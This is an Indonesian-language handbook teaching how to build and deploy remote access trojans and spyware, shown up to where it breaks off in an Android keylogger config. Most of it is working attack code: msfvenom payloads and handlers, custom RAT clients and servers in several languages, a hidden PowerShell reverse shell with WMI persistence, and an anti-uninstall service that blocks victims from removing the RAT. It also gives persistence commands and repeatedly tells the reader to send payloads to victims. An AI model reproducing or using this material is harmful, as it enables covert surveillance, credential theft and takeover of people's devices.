# **📚 BUKU PANDUAN RAT & SPYWARE: EDISI PROFESIONAL 2026**
**Teknik Remote Access Trojan & Spyware Terkini**
**Semua Metode, Tools, dan Script untuk Kontrol Penuh, Monitoring, & Evasion**

---

---

## **📋 DAFTAR ISI**

---

### **🔹 BAB 1: PENDAHULUAN RAT & SPYWARE**
- Apa Itu RAT & Spyware?
- Perbedaan RAT, Spyware, dan Trojan
- Arsitektur Umum RAT & Spyware
- Legalitas & Etika

---

### **🔹 BAB 2: PERSIAPAN LINGKUNGAN**
- Setup Termux & Kali Linux
- Tools Wajib untuk RAT & Spyware
- VPS & Tunneling untuk C2

---

### **🔹 BAB 3: RAT (REMOTE ACCESS TROJAN)**
---

#### **📌 3.1: RAT untuk Android**
- Metasploit Android Payload
- AhMyth RAT (Open Source)
- Custom RAT dengan Python
- RAT Lintas Jaringan & Wilayah
- Anti-Uninstall & Persistence

---

#### **📌 3.2: RAT untuk Windows**
- Metasploit Windows Payload
- Custom Windows RAT (C++)
- Fileless RAT (PowerShell)
- Process Injection & Hollowing

---

#### **📌 3.3: RAT untuk Linux**
- Metasploit Linux Payload
- Custom Linux RAT (Bash/Python)
- Persistence di Linux

---

#### **📌 3.4: RAT untuk MacOS**
- Metasploit MacOS Payload
- Custom MacOS RAT (Swift)

---
---

### **🔹 BAB 4: SPYWARE (MONITORING & SURVEILLANCE)**
---

#### **📌 4.1: Spyware untuk Android**
- Keylogger (Accessibility Services)
- Screen Recording & Streaming
- Camera & Microphone Spy
- Location Tracking (GPS)
- SMS, Call Logs, & WhatsApp Spy
- Clipboard & App Usage Monitoring

---

#### **📌 4.2: Spyware untuk Windows**
- Keylogger (Python/C++)
- Screen Capture & Streaming
- Webcam & Microphone Spy
- Browser History & Password Extraction
- Process & Network Monitoring

---
---

### **🔹 BAB 5: TEKNIK DELIVERY & INSTALASI**
---
- Phishing (Email, SMS, WhatsApp)
- File Binding (Gabung File Legit + Payload)
- USB Drop Attack
- QR Code Phishing (Quishing)
- Drive-by Download
- Social Engineering (Pretexting)

---
---

### **🔹 BAB 6: COMMAND & CONTROL (C2)**
---
- C2 Server (Python - WebSocket)
- C2 Server (PHP + MySQL)
- Cloud-Hosted C2 (GitHub, Dropbox, Hugging Face)
- Domain Fronting (CDN)
- DNS Tunneling
- Encryption (AES, RSA, XOR)

---
---

### **🔹 BAB 7: EVASION & ANTI-DETECTION**
---
- Obfuscation (PyArmor, Obfuscapk)
- Packing (UPX, VMProtect)
- Multi-Stage Payload
- Code Signing & Certificate Spoofing
- Anti-Sandbox & Anti-VM
- Bypass Antivirus (AV/EDR)

---
---

### **🔹 BAB 8: ANTI-FORENSICS & COVERING TRACKS**
---
- Log Sanitization
- Timestomp (Ubah Timestamp)
- Process Hollowing & Injection
- Secure Deletion (Shred, Srm)
- Registry & File System Cleanup

---
---

### **🔹 BAB 9: STUDI KASUS & SCRNARIO NYATA**
---
- Kasus 1: RAT Android dengan C2 Cloud
- Kasus 2: Spyware Windows dengan Keylogger & Screen Capture
- Kasus 3: RAT Lintas Jaringan dengan Ngrok
- Kasus 4: Spyware dengan WhatsApp & SMS Monitoring

---
---

### **🔹 BAB 10: DISCLAIMER & ETIKA**
- Peringatan Legal
- Konsekuensi Hukum di Indonesia
- Penggunaan Legal

---
---
---

---

## **🔹 BAB 1: PENDAHULUAN RAT & SPYWARE**

---

### **📌 Apa Itu RAT & Spyware?**
| Istilah | Deskripsi | Fungsi Utama |
|---------|------------|---------------|
| **RAT (Remote Access Trojan)** | Malware yang memberikan **akses jarak jauh** ke sistem korban. | Kontrol penuh (shell, file manager, execute command). |
| **Spyware** | Malware yang **mengumpulkan data** dari sistem korban tanpa sepengetahuan user. | Monitoring (keylogger, screen capture, location tracking). |
| **Trojan** | Malware yang **menyamar sebagai program legitim** untuk menipu korban. | Delivery mechanism (bawa RAT/spyware). |

---
### **📌 Perbedaan RAT, Spyware, dan Trojan**
| Fitur | RAT | Spyware | Trojan |
|-------|-----|---------|--------|
| **Akses Jarak Jauh** | ✅ | ❌ | ❌ |
| **Monitoring** | ⚠️ (bisa ditambahkan) | ✅ | ❌ |
| **Kontrol Sistem** | ✅ | ❌ | ❌ |
| **Delivery Mechanism** | ❌ | ❌ | ✅ |
| **Stealth** | ⚠️ | ✅ | ✅ |
| **Persistence** | ✅ | ✅ | ⚠️ |

---
### **📌 Arsitektur Umum RAT & Spyware**
```
[Attacker] ←── C2 Protocol (HTTPS/WebSocket/DNS) ──→ [C2 Server]
       ↑                                                  ↓
       |                                             [Command Queue]
       |                                                  ↓
[Web Panel] ←──────────────────────────────────→ [Database (Logs/Data)]
       ↑                                                  ↓
[Monitoring] ←───────────────────────────────→ [Korban (RAT/Spyware)]
```

---
### **📌 Legalitas & Etika**
✅ **Legal:**
- Penetration Testing (dengan kontrak).
- Bug Bounty (dengan izin).
- Red Team Exercise (simulasi serangan untuk organisasi sendiri).
- Security Research (di lab terisolasi).

❌ **Ilegal:**
- Mengakses sistem **tanpa izin** (UU ITE Pasal 30).
- **Spyware/RAT** tanpa sepengetahuan korban (Pelanggaran privasi).
- **Phishing** (Penipuan - Pasal 378 KUHP).
- **Distribute malware** (UU ITE Pasal 33).

---
---
---

## **🔹 BAB 2: PERSIAPAN LINGKUNGAN**

---

### **📌 Setup Termux & Kali Linux**
**Termux (Android):**
```bash
# Update & install dependencies
pkg update && pkg upgrade -y
pkg install wget openssl-tool proot git python python3 -y

# Install Kali Linux via proot-distro
proot-distro install kali
proot-distro login kali
```

**Kali Linux (Desktop):**
```bash
# Update
sudo apt update && sudo apt full-upgrade -y

# Install tools wajib
sudo apt install -y metasploit-framework nmap python3-pip git
```

---
### **📌 Tools Wajib untuk RAT & Spyware**
| Kategori | Tools | Fungsi |
|----------|-------|--------|
| **Payload Generation** | `msfvenom`, `AhMyth`, `Unicorn` | Generate RAT payload. |
| **C2 Framework** | `Evilginx2`, `Cobalt Strike`, `Mythic` | Command & Control. |
| **Obfuscation** | `PyArmor`, `Obfuscapk`, `Shellter` | Bypass AV. |
| **Packing** | `UPX`, `VMProtect`, `Themida` | Kompres & proteksi payload. |
| **Tunneling** | `ngrok`, `Cloudflare Tunnel`, `Chisel` | Bypass NAT/Firewall. |
| **Monitoring** | `BeEF`, `Evilginx2`, `SocialFish` | Phishing & session hijacking. |
| **Development** | `Android Studio`, `APKTool`, `JADX` | Modify APK. |
| **Debugging** | `GDB`, `Frida`, `Objection` | Reverse engineering. |

**Installasi di Kali:**
```bash
sudo apt install -y msfvenom apktool jadx upx python3-pip
pip3 install pyarmor obfuscator frida-tools
```

---
### **📌 VPS & Tunneling untuk C2**
| Layanan | Fungsi | Harga | Keunggulan |
|---------|--------|-------|------------|
| **DigitalOcean** | VPS | $5/bulan | Stabil, mudah setup. |
| **Vultr** | VPS | $5/bulan | Locations banyak. |
| **Linode** | VPS | $5/bulan | Good performance. |
| **AWS Lightsail** | VPS | $3.5/bulan | Scalable. |
| **Ngrok** | Tunneling | Gratis (limit) | Mudah, cepat. |
| **Cloudflare Tunnel** | Tunneling | Gratis | Stealth (HTTPS). |
| **LocalXpose** | Tunneling | Gratis | Alternatif ngrok. |

**Contoh Setup VPS (DigitalOcean):**
1. Buat droplet Ubuntu 22.04.
2. SSH ke VPS:
   ```bash
   ssh root@IP_VPS
   ```
3. Install dependencies:
   ```bash
   apt update && apt install -y python3 python3-pip nginx certbot
   pip3 install websockets flask
   ```
4. Setup C2 server (lihat Bab 6).

---
---
---

## **🔹 BAB 3: RAT (REMOTE ACCESS TROJAN)**

---
---
---

### **📌 3.1: RAT untuk Android**
---
#### **🔹 Metasploit Android Payload**
**Generasi Payload:**
```bash
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=IP_VPS_OR_NGROK \
    LPORT=4444 \
    -o payload.apk
```

**Handler (Listener):**
```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

**Perintah di Meterpreter:**
| Perintah | Deskripsi |
|----------|------------|
| `sysinfo` | Info device (model, Android version). |
| `webcam_snap` | Ambil foto dari kamera. |
| `record_mic 30` | Rekam suara 30 detik. |
| `dump_sms` | Baca SMS. |
| `dump_contacts` | Baca kontak. |
| `geolocate` | Lokasi GPS. |
| `shell` | Buka shell Android. |
| `download /sdcard/file.txt` | Download file. |
| `upload /path/to/file.apk` | Upload file. |
| `screenshot` | Ambil screenshot. |
| `screenrec 30` | Rekam layar 30 detik. |

---
#### **🔹 AhMyth RAT (Open Source)**
**Keunggulan:**
- **Open source** (bisa dimodifikasi).
- **Web panel** untuk monitoring.
- **Multi-feature** (keylogger, screen capture, dll).
- **Persistence** (auto-start on boot).

**Installasi:**
```bash
git clone https://github.com/AhMyth/AhMyth-Android-RAT.git
cd AhMyth-Android-RAT
# Buka AhMyth.jar (butuh Java)
java -jar AhMyth.jar
```
**Langkah:**
1. **Build APK** (masukkan IP VPS/C2).
2. **Start Listener** (port 8080 default).
3. **Kirim APK** ke korban.
4. **Monitor** via web panel (`http://IP_VPS:8080`).

---
#### **🔹 Custom RAT dengan Python (Socket-Based)**
**Server (C2):**
```python
#!/usr/bin/env python3
import socket
import threading
import json
import os

class AndroidRATServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  # {address: (socket, device_info)}

    def start(self):
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(10)
        print(f"[*] RAT Server listening on {self.host}:{self.port}")

        while True:
            client_socket, addr = self.server.accept()
            print(f"[+] New connection from {addr[0]}:{addr[1]}")
            threading.Thread(
                target=self.handle_client,
                args=(client_socket, addr),
                daemon=True
            ).start()

    def handle_client(self, sock, addr):
        try:
            # Terima info device
            data = sock.recv(4096).decode()
            device_info = json.loads(data)
            self.clients[addr] = (sock, device_info)
            print(f"[+] Device registered: {device_info['model']} (Android {device_info['version']})")

            while True:
                # Terima command dari attacker
                cmd = input(f"[{addr[0]}:{addr[1]}] Command > ")
                if cmd.lower() == 'exit':
                    break

                sock.send(cmd.encode())

                # Terima output
                output = sock.recv(4096).decode()
                print(output)

        except Exception as e:
            print(f"[-] Connection lost: {e}")
            if addr in self.clients:
                del self.clients[addr]
        finally:
            sock.close()

if __name__ == "__main__":
    server = AndroidRATServer()
    server.start()
```

**Client (Payload - Android):**
```java
// MainActivity.java
package com.example.rat;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends android.app.Activity {
    private String serverIp = "192.168.1.100";  // Ganti dengan IP VPS
    private int serverPort = 5555;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(() -> {
            try {
                Socket socket = new Socket(serverIp, serverPort);
                OutputStream out = socket.getOutputStream();
                InputStreamReader in = new InputStreamReader(socket.getInputStream());
                BufferedReader reader = new BufferedReader(in);

                // Kirim info device
                String deviceInfo = String.format(
                    "{\"model\":\"%s\",\"version\":\"%s\",\"manufacturer\":\"%s\"}",
                    android.os.Build.MODEL,
                    android.os.Build.VERSION.RELEASE,
                    android.os.Build.MANUFACTURER
                );
                out.write(deviceInfo.getBytes());
                out.flush();

                // Command loop
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.equalsIgnoreCase("exit")) break;

                    // Execute command
                    Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", line});
                    BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String cmdLine;
                    while ((cmdLine = cmdReader.readLine()) != null) {
                        output.append(cmdLine).append("\n");
                    }
                    out.write(output.toString().getBytes());
                    out.flush();
                }
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
```

**AndroidManifest.xml:**
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.rat">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <application android:label="System Update">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**Cara Build APK:**
1. Buka di **Android Studio**.
2. Build → **Generate Signed Bundle / APK**.
3. Pilih **APK** (bukan Bundle).
4. Sign dengan **keystore** (buat jika belum ada).
5. Distribute APK ke korban.

---
#### **🔹 RAT Lintas Jaringan & Wilayah**
**Masalah:** Payload di HP korban **tidak bisa connect** ke IP lokal attacker (192.168.x.x).

**Solusi:**
| Solusi | Keunggulan | Kekurangan | Cara Pakai |
|--------|------------|------------|------------|
| **VPS** | Stabil, 24/7, IP publik | Berbayar (~$5/bulan) | Sewa VPS (DigitalOcean, Vultr). |
| **Ngrok** | Gratis, mudah | Lambat, tidak stabil | `ngrok tcp 4444` |
| **Cloudflare Tunnel** | Stealth (HTTPS) | Kompleks | `cloudflared tunnel` |
| **LocalXpose** | Alternatif ngrok | Limitasi | `lxp tcp 4444` |
| **Port Forwarding** | Gratis | Hanya untuk IP publik | Router setting. |

**Contoh dengan Ngrok:**
```bash
# Di attacker machine
ngrok tcp 4444

# Output: Forwarding tcp://0.tcp.ngrok.io:12345 -> localhost:4444
# Payload connect ke: 0.tcp.ngrok.io:12345
```

**Contoh dengan VPS:**
```bash
# Di VPS
python3 c2_server.py

# Payload connect ke: IP_VPS:5555
```

---
#### **🔹 Anti-Uninstall & Persistence**
**Teknik untuk mencegah korban uninstall RAT:**

| Teknik | Deskripsi | Implementasi |
|--------|------------|---------------|
| **Accessibility Service** | Auto-klik "Cancel" saat korban mencoba uninstall. | Java: `AccessibilityService`. |
| **Device Admin** | RAT terdaftar sebagai Device Admin → korban harus remove admin dulu. | Java: `DeviceAdminReceiver`. |
| **Hidden Icon** | Tidak ada icon di launcher. | `AndroidManifest.xml`: Hapus `LAUNCHER` intent. |
| **Boot Receiver** | Auto-start saat HP restart. | Java: `BroadcastReceiver` + `BOOT_COMPLETED`. |
| **Foreground Service** | Notifikasi fake ("System Update Running"). | Java: `startForeground()`. |
| **AlarmManager** | Bangun service tiap 15 menit walau HP sleep. | Java: `AlarmManager`. |

**Contoh Kode (Java - Anti-Uninstall):**
```java
// AntiUninstallService.java
public class AntiUninstallService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText("Uninstall");
                for (AccessibilityNodeInfo node : nodes) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    break;
                }
            }
        }
    }
    @Override
    public void onInterrupt() {}
}
```

**AndroidManifest.xml (Tambahan):**
```xml
<service android:name=".AntiUninstallService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>
```

**accessibility_service_config.xml:**
```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeWindowStateChanged"
    android:accessibilityFlags="flagRequestFilterKeyEvents"
    android:canRetrieveWindowContent="true" />
```

---
---
---

### **📌 3.2: RAT untuk Windows**
---
#### **🔹 Metasploit Windows Payload**
**Generasi Payload:**
```bash
# Reverse TCP (HTTP untuk bypass firewall)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=IP_VPS_OR_NGROK \
    LPORT=443 \
    -f exe -o payload.exe

# Bypass AV (encoding)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=IP_VPS LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -f exe -o encoded_payload.exe
```

**Handler:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit -j
```

**Perintah di Meterpreter:**
| Perintah | Deskripsi |
|----------|------------|
| `sysinfo` | Info sistem (Windows version, architecture). |
| `getuid` | User yang sedang login. |
| `hashdump` | Dump password hash. |
| `mimikatz` | Extract credentials (memerlukan `mimikatz`). |
| `screenshot` | Ambil screenshot. |
| `record_mic 30` | Rekam suara. |
| `webcam_snap` | Ambil foto dari webcam. |
| `shell` | Buka CMD. |
| `upload file.exe C:\\Temp\\` | Upload file. |
| `download C:\\secret.txt` | Download file. |
| `persist` | Setup persistence. |
| `clearev` | Hapus event logs. |

---
#### **🔹 Custom Windows RAT (C++)**
**File: `rat_server.cpp` (Attacker)**
```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#include <string>
#include <thread>
#include <vector>
#include <mutex>

#pragma comment(lib, "ws2_32.lib")

std::vector<SOCKET> clients;
std::mutex clients_mutex;

void handle_client(SOCKET client_socket, sockaddr_in client_addr) {
    char buffer[4096];
    int bytes_received;

    // Terima info client
    bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("[+] New client: %s\n", buffer);
    }

    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer), 0)) > 0) {
        buffer[bytes_received] = '\0';
        printf("[%s] %s\n", inet_ntoa(client_addr.sin_addr), buffer);

        // Kirim command
        std::string cmd;
        std::getline(std::cin, cmd);
        if (cmd == "exit") break;
        send(client_socket, cmd.c_str(), cmd.length(), 0);
    }

    closesocket(client_socket);
    std::lock_guard<std::mutex> lock(clients_mutex);
    clients.erase(std::remove(clients.begin(), clients.end(), client_socket), clients.end());
}

int main() {
    WSADATA wsaData;
    SOCKET server_socket = INVALID_SOCKET;
    sockaddr_in server_addr;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_socket, 10);

    printf("[*] Server listening on port 5555\n");

    while (true) {
        sockaddr_in client_addr;
        int client_addr_len = sizeof(client_addr);
        SOCKET client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_len);

        std::lock_guard<std::mutex> lock(clients_mutex);
        clients.push_back(client_socket);

        std::thread(handle_client, client_socket, client_addr).detach();
    }

    closesocket(server_socket);
    WSACleanup();
    return 0;
}
```

**File: `rat_client.cpp` (Victim)**
```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#include <string>
#include <sstream>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET client_socket = INVALID_SOCKET;
    sockaddr_in server_addr;
    char buffer[4096];
    int bytes_received;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.100");  // Ganti dengan IP attacker
    server_addr.sin_port = htons(5555);

    if (connect(client_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    // Kirim info sistem
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);

    std::string system_info = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion);
    send(client_socket, system_info.c_str(), system_info.length(), 0);

    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer), 0)) > 0) {
        buffer[bytes_received] = '\0';
        std::string cmd(buffer);

        if (cmd == "exit") break;

        // Execute command
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) continue;

        std::string output;
        char pipe_buffer[128];
        while (fgets(pipe_buffer, sizeof(pipe_buffer), pipe) != NULL) {
            output += pipe_buffer;
        }
        _pclose(pipe);

        send(client_socket, output.c_str(), output.length(), 0);
    }

    closesocket(client_socket);
    WSACleanup();
    return 0;
}
```

**Compile (Windows):**
```bash
# Di CMD (Windows)
g++ rat_server.cpp -o rat_server.exe -lws2_32
g++ rat_client.cpp -o rat_client.exe -lws2_32
```

---
#### **🔹 Fileless RAT (PowerShell)**
**Keunggulan:**
- **Tidak menyimpan file** di disk (jalan di memory).
- **Bypass AV** (tidak ada file untuk di-scan).
- **Stealth** (tidak meninggalkan jejak file).

**Payload (PowerShell):**
```powershell
# Stage 1: Download & execute langsung
powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII).GetBytes($r2),0,$r2.Length);$s.Flush()};$c.Close()"

# Stage 2: Fileless persistence (WMI)
$action = New-WmiInstance -ClassName __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

$consumer = New-WmiInstance -ClassName CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);...\""
}

$binding = New-WmiInstance -ClassName __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $action
    Consumer = $consumer
}
```

---
#### **🔹 Process Injection & Hollowing (Windows)**
**Konsep:**
- **Process Hollowing**: Mengganti kode process legit dengan malware.
- **Process Injection**: Menyuntikkan malware ke process yang sudah berjalan.

**Tools:**
| Tool | Deskripsi | Link |
|------|-----------|------|
| **sRDI** | Shellcode Reflective DLL Injection | [GitHub](https://github.com/monoxgas/sRDI) |
| **Donut** | Convert .NET assembly ke shellcode | [GitHub](https://github.com/TheWover/donut) |
| **Metasploit** | `migrate` command | - |
| **Cobalt Strike** | Process injection built-in | - |

**Contoh dengan sRDI:**
```bash
# Generate shellcode dari DLL
sRDI -f malicious.dll -o shellcode.bin

# Inject ke process (contoh: explorer.exe)
# Pakai tool: ProcessHacker + manual injection
```

---
---
---

### **📌 3.3: RAT untuk Linux**
---
#### **📌 Metasploit Linux Payload**
```bash
msfvenom -p linux/x86_64/meterpreter/reverse_tcp \
    LHOST=IP_VPS LPORT=4444 \
    -f elf -o payload.elf
```

**Handler:**
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86_64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

---
#### **🔹 Custom Linux RAT (Bash)**
**Server (C2):**
```bash
#!/bin/bash
# rat_server.sh
PORT=5555
nc -lvnp $PORT
```

**Client (Payload):**
```bash
#!/bin/bash
# rat_client.sh
SERVER="192.168.1.100"
PORT=5555

# Kirim info sistem
HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname -a)

echo "Host: $HOSTNAME | User: $USER | OS: $OS" | nc $SERVER $PORT

# Command loop
while true; do
    read -p "[$HOSTNAME] Command > " cmd
    if [[ "$cmd" == "exit" ]]; then
        break
    fi
    eval "$cmd" | nc $SERVER $PORT
done
```

**Cara Pakai:**
```bash
# Di attacker
chmod +x rat_server.sh
./rat_server.sh

# Di victim
chmod +x rat_client.sh
./rat_client.sh
```

---
#### **🔹 Persistence di Linux**
| Teknik | Deskripsi | Command |
|--------|------------|---------|
| **Cron Job** | Jalankan payload tiap reboot | `(crontab -l 2>/dev/null; echo "@reboot /path/to/payload") \| crontab -` |
| **Systemd Service** | Buat service sistem | `systemctl enable /etc/systemd/system/rat.service` |
| **RC.Local** | Tambah ke /etc/rc.local | `echo "/path/to/payload &" >> /etc/rc.local` |
| **Bashrc/Zshrc** | Tambah ke shell startup | `echo "/path/to/payload &" >> ~/.bashrc` |
| **LD_PRELOAD** | Hijack library calls | `export LD_PRELOAD=/path/to/malicious.so` |

**Contoh Systemd Service:**
```bash
# /etc/systemd/system/rat.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/payload
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

---
---
---

### **📌 3.4: RAT untuk MacOS**
---
#### **📌 Metasploit MacOS Payload**
```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp \
    LHOST=IP_VPS LPORT=4444 \
    -f macho -o payload.macho
```

**Handler:**
```bash
msfconsole
use exploit/multi/handler
set payload osx/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

---
#### **🔹 Custom MacOS RAT (Swift)**
**Server (C2 - Python):**
```python
#!/usr/bin/env python3
import socket
import threading

def handle_client(sock, addr):
    print(f"[+] New connection from {addr}")
    while True:
        cmd = input(f"[{addr[0]}:{addr[1]}] Command > ")
        if cmd.lower() == 'exit':
            break
        sock.send(cmd.encode())
        output = sock.recv(4096).decode()
        print(output)

HOST = '0.0.0.0'
PORT = 5555

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"[*] Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()
```

**Client (Payload - Swift):**
```swift
// main.swift
import Foundation

let server = "192.168.1.100"
let port = 5555

var inputStream: InputStream?
var outputStream: OutputStream?

Stream.getStreamsToHost(withName: server, port: port, inputStream: &inputStream, outputStream: &outputStream)

if let inputStream = inputStream, let outputStream = outputStream {
    inputStream.open()
    outputStream.open()

    // Kirim info sistem
    let hostname = ProcessInfo.processInfo.hostName
    let user = NSUserName()
    let os = ProcessInfo.processInfo.operatingSystemVersionString
    let info = "Host: \(hostname) | User: \(user) | OS: \(os)\n"

    outputStream.write(info, maxLength: info.count)

    // Command loop
    var buffer = UInt8
    while true {
        let bytesRead = inputStream.read(&buffer, maxLength: buffer.count)
        if bytesRead > 0 {
            let cmd = String(bytes: buffer, encoding: .utf8)!.trimmingCharacters(in: .controlCharacters)
            if cmd == "exit" { break }

            let pipe = Pipe()
            let task = Process()
            task.launchPath = "/bin/bash"
            task.arguments = ["-c", cmd]
            task.standardOutput = pipe
            task.standardError = pipe
            task.launch()
            task.waitUntilExit()

            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            if let output = String(data: data, encoding: .utf8) {
                outputStream.write(output, maxLength: output.count)
            }
        }
    }

    inputStream.close()
    outputStream.close()
}
```

**Cara Build:**
```bash
# Di MacOS
swiftc main.swift -o payload
```

---
---
---

## **🔹 BAB 4: SPYWARE (MONITORING & SURVEILLANCE)**

---
---
---

### **📌 4.1: Spyware untuk Android**
---
#### **🔹 Keylogger (Accessibility Services)**
**Keunggulan:**
- **Tidak memerlukan root**.
- **Bisa merekam semua input** (keyboard, touch).
- **Bypass deteksi** (terlihat sebagai accessibility service).

**Contoh Kode (Java):**
```java
// KeyloggerService.java
package com.example.spyware;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {
    private static final String LOG_FILE = "/sdcard/.keylog.txt";
    private FileWriter fileWriter;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            File logFile = new File(LOG_FILE);
            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            fileWriter = new FileWriter(logFile, true);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo node = event.getSource();
            if (node != null) {
                CharSequence text = node.getText();
                if (text != null) {
                    logText(text.toString());
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    private void logText(String text) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            String timestamp = sdf.format(new Date());
            fileWriter.write("[" + timestamp + "] " + text + "\n");
            fileWriter.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (fileWriter != null) {
                fileWriter.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**AndroidManifest.xml:**
```xml
<service
    android:name=".KeyloggerService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>
```

**accessibility_service_config.xml:**
```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
